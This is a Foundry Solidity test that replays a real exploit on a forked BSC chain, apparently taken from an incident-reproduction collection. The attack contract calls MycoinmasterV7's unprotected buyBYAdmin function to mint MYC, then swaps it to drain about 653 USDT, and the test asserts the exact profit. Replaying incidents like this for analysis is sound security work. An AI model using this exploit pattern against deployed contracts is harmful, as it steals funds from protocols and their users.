// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 653.49 USD
// Attacker : 0xEBE15A67e37203563d0D99AafAf06eCf41305FbA
// Attack Contract : 0x436322d4a854E89cDdaFF00C2c1cB72015f37ca1
// Vulnerable Contract : 0xEF9A10D6abFd5D3aA345a008c0F9132Ce4b23E70
// Attack Tx : https://bscscan.com/tx/0x57865009e1cfb7516240eb901342f3b434c2a2754e14604c838024ffe2e191a7
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xEF9A10D6abFd5D3aA345a008c0F9132Ce4b23E70#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1628
//
// Attack summary: MycoinmasterV7 exposed buyBYAdmin(uint256,address,address) without an admin check. The attacker used
// it to mint a large locked MYC position to the victim contract and a 1% MYC airdrop to the attack contract, then
// called swap(uint256). swap() accepted the airdropped MYC and paid USDT from the victim contract.
// Root cause: missing access control on buyBYAdmin plus direct USDT redemption in swap().

address constant ATTACKER = 0xEBE15A67e37203563d0D99AafAf06eCf41305FbA;
address constant ATTACK_CONTRACT = 0x436322d4a854E89cDdaFF00C2c1cB72015f37ca1;
address constant MYCOINMASTER = 0xEF9A10D6abFd5D3aA345a008c0F9132Ce4b23E70;
address constant MYC = 0x0f1c6638561F29F489E24D234014F4dEba1A9ABd;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

interface IMyCoinMaster {
    function buyBYAdmin(uint256 tokens, address sponsor, address user) external payable;
    function swap(
        uint256 tokens
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    MyCoinMasterAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 56_555_696;
        vm.createSelectFork("bsc", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(MYCOINMASTER, "Mycoinmaster Proxy");
        vm.label(MYC, "MYC");
        vm.label(USDT_TOKEN, "USDT");

        exploit = new MyCoinMasterAttack();
        fundingToken = USDT_TOKEN;
        attacker = address(exploit);
    }

    function testExploit() public balanceLog {
        uint256 victimUsdtBefore = IERC20(USDT_TOKEN).balanceOf(MYCOINMASTER);
        exploit.run();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(address(exploit));
        assertEq(profit, 653_629_999_995_700_000_000, "USDT profit");
        assertEq(victimUsdtBefore - IERC20(USDT_TOKEN).balanceOf(MYCOINMASTER), profit, "victim USDT loss");
    }
}

contract MyCoinMasterAttack {
    function run() external {
        uint256 mycMintAmount = 100_000_000_000_000;
        uint256 swapAmount = 120_225_946_717;

        IMyCoinMaster(MYCOINMASTER).buyBYAdmin(mycMintAmount, address(this), address(this));
        IERC20(MYC).approve(MYCOINMASTER, swapAmount);
        IMyCoinMaster(MYCOINMASTER).swap(swapAmount);
    }
}
